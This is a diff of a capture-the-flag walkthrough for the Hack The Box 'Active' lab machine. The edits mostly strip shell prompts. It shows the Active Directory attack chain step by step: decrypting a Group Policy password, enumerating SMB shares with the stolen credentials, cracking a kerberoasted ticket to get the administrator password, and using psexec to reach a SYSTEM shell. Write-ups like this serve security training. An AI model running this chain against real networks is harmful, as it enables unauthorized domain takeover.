@@ -77,7 +77,7 @@ a tool called "gpp-decrypt" that can be utilized for decrypting GPP (Group Polic
 ![https://media.discordapp.net/attachments/928373179003600907/1159047076789887016/5.png?ex=651e7635&is=651d24b5&hm=044300dbdde47c3cea475a83a299c7ef7f9e9649141413bcf3a7831549248552&=&width=1836&height=114](https://media.discordapp.net/attachments/928373179003600907/1159047076789887016/5.png?ex=651e7635&is=651d24b5&hm=044300dbdde47c3cea475a83a299c7ef7f9e9649141413bcf3a7831549248552&=&width=1836&height=114)
 
 ```bash
-root@kali# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
 ```
 
@@ -90,7 +90,7 @@ With a username and password, I can access 3 more shares
 There is a Users share that looks interesting
 
 ```bash
-root@kali# smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
 [+] Finding open SMB ports....
 [+] User SMB session establishd on 10.10.10.100...
 [+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
@@ -150,12 +150,12 @@ $ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
 
 And we got the administrator password : **Ticketmaster1968**
 
-> ## Administrator Access
+> ##  Administrator Access
 
 As we already have admin creds through kerberoasting, we can get the system shell using psexec.py
 
 ```bash
-root@kali# psexec.py active.htb/administrator@10.10.10.100
+psexec.py active.htb/administrator@10.10.10.100
 Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
 
 Password:
@@ -172,9 +172,6 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>whoami
 nt authority\system
 ```
-
-![https://cdn.discordapp.com/attachments/928373179003600907/1159058806349778944/image.png?ex=651e8121&is=651d2fa1&hm=3691f9cc6292a3dea0c27e2a66526177f7fd1aad6c00315717d310d7ed537fdc&](https://cdn.discordapp.com/attachments/928373179003600907/1159058806349778944/image.png?ex=651e8121&is=651d2fa1&hm=3691f9cc6292a3dea0c27e2a66526177f7fd1aad6c00315717d310d7ed537fdc&)
-
 
 ## Have any questions
 Do you have any questions? Feel free to reach out to me on [twitter](https://twitter.com/rach1tarora) or on [LinkedIn](https://www.linkedin.com/in/rach1tarora/).
